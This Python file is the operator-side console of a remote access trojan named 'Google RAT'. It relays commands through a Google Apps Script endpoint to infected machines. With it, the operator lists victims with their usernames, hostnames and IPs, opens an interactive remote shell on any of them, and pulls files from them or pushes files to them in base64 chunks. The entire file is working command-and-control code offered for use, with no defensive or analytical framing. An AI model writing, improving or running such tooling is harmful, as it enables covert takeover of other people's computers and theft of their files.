#!/usr/bin/env python3
import os
import re
import time
import shlex
import random
import base64
import hashlib
import logging
import requests
import datetime
import argparse

BANNER = """
*******************************************************************************
Google RAT
*******************************************************************************
# view help:
python script.py -h
# connect to a server
python script.py https://script.google.com/macros/s/.../exec
*******************************************************************************
"""


class Server(object):
  SHELL_BANNER = 'ICAgICAgICAgIF9fXwogICAgLiAtXiAgIGAtLSwKICAgLyMgPT09PT09PT09YC1fICAgICAgICstKy0rLSstKyArLSstKyArLSstKy0rLSsgKy0rLSstKyArLSstKy0rCiAgLyMgKC0tPT09PV9fXz09PT1cICAgICB8U3xIfE98V3wgfE18RXwgfFd8SHxBfFR8IHxZfE98VXwgfEd8T3xUfAogLyMgICAuLSAtLS4gIC4gLS0ufCAgICAgKy0rLSstKy0rICstKy0rICstKy0rLSstKyArLSstKy0rICstKy0rLSsKLyMjICAgfCAgKiApICggICAqICksICAgICAgICAgICAgICAgICAgIEF1dGhvcjogTXIuIFBvb3B5YnV0dGhvbGUKfCMjICAgXCAgICAvXCBcICAgLyB8CnwjIyMgICAtLS0gICBcIC0tLSAgfAp8IyMjIyAgICAgIF9fXykgICAgI3wKfCMjIyMjIyAgICAgICAgICAgIyN8CiBcIyMjIyMgLS0tLS0tLS0tLSAvCiAgXCMjIyMgICAgICAgICAgICgKICAgYFwjIyMgICAgICAgICAgfAogICAgIFwjIyMgICAgICAgICB8CiAgICAgIFwjIyAgICAgICAgfAogICAgICAgXCMjIy4gICAgLikKICAgICAgICBgPT09PT09Lw=='
  CHUNK_SIZE = 50000 # 50 KB
  # client command types
  CLIENT_EXECUTE  = '0'
  CLIENT_UPLOAD   = '1'
  CLIENT_DOWNLOAD = '2'

  def __init__(self, srv, key):
    self.srv = srv
    self.key = key
    self.hosts = []
    logging.info('connecting to {}'.format(self.srv))
    r = requests.get(self.srv, params={'k':self.key})
    if r.status_code != requests.codes.ok:
      logging.error(f'server not responding. response: {str(r.status_code)}')
    else:
      logging.success('server is up')
    print(base64.b64decode(Server.SHELL_BANNER.encode('UTF-8')).decode('UTF-8'))
    logging.info('type "help" for a list of commands')

  def _isUUID(self, uuid):
    # https://www.ietf.org/rfc/rfc4122.txt
    return re.findall(r'^[0-9a-f]{8}-[0-9a-f]{4}-[0-5][0-9a-f]{3}-[089ab][0-9a-f]{3}-[0-9a-f]{12}$', uuid)

  def _transfer(self, uuid, prefix, data):
    # split data into chunks
    chunks = [data[i:i + Server.CHUNK_SIZE] for i in range(0, len(data), Server.CHUNK_SIZE)]
    # send prefix first if specified
    if prefix:
      if len(prefix) > Server.CHUNK_SIZE:
        logging.error(f'prefix length {len(prefix)} is larger than max chunk size {Server.CHUNK_SIZE}')
        return ''
      chunks.insert(0, prefix)
    logging.info(f'sending {len(chunks)} data chunks to client ...')
    for i in range(len(chunks)):
      while True:
        logging.debug(f'sending chunk {i} ...')
        r = requests.post(self.srv, data={'k':self.key,'u':uuid,'d':chunks[i]})
        if r.ok:
          break
    # signal all chunks sent
    while True:
      logging.debug('sending NULL chunk ...')
      r = requests.post(self.srv, data={'k':self.key,'u':uuid,'d':''})
      if r.ok:
        break
    logging.success('all chunks sent. waiting for client response ...')
    data = []
    while True:
      logging.debug('checking if client has sent response ...')
      r = requests.get(self.srv, params={'k':self.key,'u':uuid,'d':'get'})
      if not r.ok:
        logging.warning(f'got a bad HTTP code from server? {str(r.status_code)}')
        continue
      if r.text:
        data.append(r.text)
        logging.info('client is done uploading. downloading client chunks ...')
        logging.debug(f'downloaded client chunk of {len(r.text)} bytes')
        break
      # random back off
      backoff = random.randint(1,10)
      logging.debug(f'no client data. sleeping for {backoff} seconds ...')
      time.sleep(backoff)
    while True:
      r = requests.get(self.srv, params={'k':self.key,'u':uuid,'d':'get'})
      if not r.ok:
        logging.warning(f'got a bad HTTP code from server? {str(r.status_code)}')
        continue
      if not r.text:
        break
      data.append(r.text)
      logging.debug(f'downloaded client chunk of {len(r.text)} bytes')
    logging.success(f'downloaded all {len(data)} client chunks')
    return ''.join(data)

  def help(self):
    print('lsc                        - list all clients')
    print('info <uuid>                - get client info for a given uuid')
    print('shell <uuid>               - start session to run remote commands on a given uuid')
    print('down <uuid> <remote>       - download a remote file from a given uuid to the current directory')
    print('up <uuid> <local> <remote> - upload a local file for a given uuid to a remote path')
    print('q                          - exit')

  def server_client_info(self, uuid):
    # check UUID
    if not self._isUUID(uuid):
      logging.error(f'bad client UUID: {uuid}')
      return
    logging.info(f'fetching client info for {uuid} ...')
    r = requests.get(self.srv, params={'k':self.key,'u':uuid,'d':'info'})
    if r.status_code != requests.codes.ok:
      logging.error(f'failed to execute "info" server command. response: {r.status_code}')
      return None
    if not r.content:
      logging.warning(f'no client info found for {uuid}?')
      return None
    # unpack client main fields
    raw_client_info = r.text.split('|')
    result = {
      'uuid':   raw_client_info[0],
      'date':   raw_client_info[1],
      'state':  raw_client_info[3],
    }
    # unpack encoded client info field
    raw_info = base64.b64decode(raw_client_info[2].encode('UTF-8')).decode('UTF-8').split('|')
    result['user'] = raw_info[0]
    result['host'] = raw_info[1]
    result['ip'] = raw_info[2]
    logging.success(f"[{result['uuid']}][{result['date']}][{result['state']}] {result['user']}@{result['host']} ({result['ip']})")
    return result

  def server_list_clients(self):
    r = requests.get(self.srv, params={'k':self.key,'d':'lsc'})
    if r.status_code != requests.codes.ok:
      logging.error(f'failed to execute "ls" server command. response: {r.status_code}')
    else:
      hosts = []
      raw = r.content.decode('UTF-8').split('|')
      if not raw or not len(raw[0]):
        logging.warning('no hosts found?')
        return
      for uuid,date,raw_info,state in zip(raw[0::4], raw[1::4], raw[2::4], raw[3::4]):
        # extract info from encoded raw info
        info = base64.b64decode(raw_info.encode('UTF-8')).decode('UTF-8').split('|')
        print(f'[{uuid}][{date}][{state}] {info[0]}@{info[1]} ({info[2]})')

  def client_download(self, uuid, remote_path):
    # check UUID
    if not self._isUUID(uuid):
      logging.error(f'bad client UUID: {uuid}')
      return
    logging.info(f'downloading file {remote_path} from client {uuid} ...')
    prefix = f"{Server.CLIENT_DOWNLOAD}|{base64.b64encode(remote_path.encode('UTF-8')).decode('UTF-8')}"
    encoded_data = self._transfer(uuid=uuid, prefix=prefix, data='')
    # write to local file
    sha1 = hashlib.sha1()
    filename = f'{uuid}.{int(time.time())}'
    logging.info(f'writing data to {filename} ...')
    with open(filename,'wb') as f:
      raw = base64.b64decode(encoded_data)
      f.write(raw)
      sha1.update(raw)
    logging.success(f'file SHA-1 hash: {sha1.hexdigest()}')

  def client_upload(self, uuid, local_path, remote_path):
    # check UUID
    if not self._isUUID(uuid):
      logging.error(f'bad client UUID: {uuid}')
      return
    # check local path
    if not os.path.exists(local_path):
      logging.error(f'bad local path: {local_path}')
      return
    # read in file data
    with open(local_path, 'rb') as f:
      raw_data = f.read()
    logging.info(f'uploading file {local_path} to {uuid} at {remote_path} ...')
    prefix = f"{Server.CLIENT_UPLOAD}|{base64.b64encode(remote_path.encode('UTF-8')).decode('UTF-8')}"
    resp = self._transfer(uuid=uuid, prefix=prefix, data=base64.b64encode(raw_data).decode('UTF-8'))
    if resp != 'ok':
      logging.warning(f"received unexpected client response? {base64.b64decode(resp).decode('UTF-8')}")
    else:
      logging.success('upload DONE')

  def client_shell(self, uuid):
    # check UUID
    if not self._isUUID(uuid):
      logging.error(f'bad client UUID: {uuid}')
      return
    logging.info(f'starting shell with {uuid} ...')
    logging.info('enter "quit" to exit')
    while True:
      cmd = input(f'{uuid}> ').lower()
      if cmd == 'quit':
        logging.info(f'exiting shell on {uuid} ...')
        break
      if cmd.strip():
        encoded_cmd = f"{Server.CLIENT_EXECUTE}|{base64.b64encode(cmd.encode('UTF-8')).decode('UTF-8')}"
        raw = self._transfer(uuid=uuid, prefix='', data=encoded_cmd)
        print(base64.b64decode(raw).decode('UTF-8'))


if __name__ == '__main__':
  # parse user arguments
  parser = argparse.ArgumentParser(usage=BANNER)
  parser.add_argument('server_url', help='google apps server URL', type=str)
  parser.add_argument('-k', dest='master_key', help='master key for server', type=str)
  parser.add_argument('-l', dest='logging_level', default='INFO', help='logging level for output', type=str)
  args = parser.parse_args()
  # setup logger
  logging.basicConfig(format='[%(asctime)s][%(levelname)s] %(message)s', datefmt='%d %b %Y %H:%M:%S', level=args.logging_level)
  logging.SUCCESS = logging.CRITICAL + 1
  logging.addLevelName(logging.SUCCESS, '\033[0m\033[1;32mOK\033[0m')
  logging.addLevelName(logging.ERROR,   '\033[0m\033[1;31mERROR\033[0m')
  logging.addLevelName(logging.WARNING, '\033[0m\033[1;33mWARN\033[0m')
  logging.addLevelName(logging.INFO,    '\033[0m\033[1;36mINFO\033[0m')
  logging.success = lambda msg, *args: logging.getLogger(__name__)._log(logging.SUCCESS, msg, args)
  # create server connection manager object
  srv = Server(args.server_url, args.master_key)
  # accept user input for hosts
  while True:
    args = shlex.split(input('> '))
    if not args:
      srv.help()
      continue
    if args[0] == 'q':
      break
    elif args[0] == 'lsc':
      srv.server_list_clients()
    elif args[0] == 'info':
      if len(args) != 2:
        logging.error('missing arguments')
        srv.help()
        continue
      srv.server_client_info(args[1])
    elif args[0] == 'down':
      if len(args) != 3:
        logging.error('missing arguments')
        srv.help()
        continue
      srv.client_download(args[1], args[2])
    elif args[0] == 'up':
      if len(args) != 4:
        logging.error('missing arguments')
        srv.help()
        continue
      srv.client_upload(args[1], args[2], args[3])
    elif args[0] == 'shell':
      if len(args) != 2:
        logging.error('missing client UUID')
        continue
      srv.client_shell(args[1])
    else:
      srv.help()
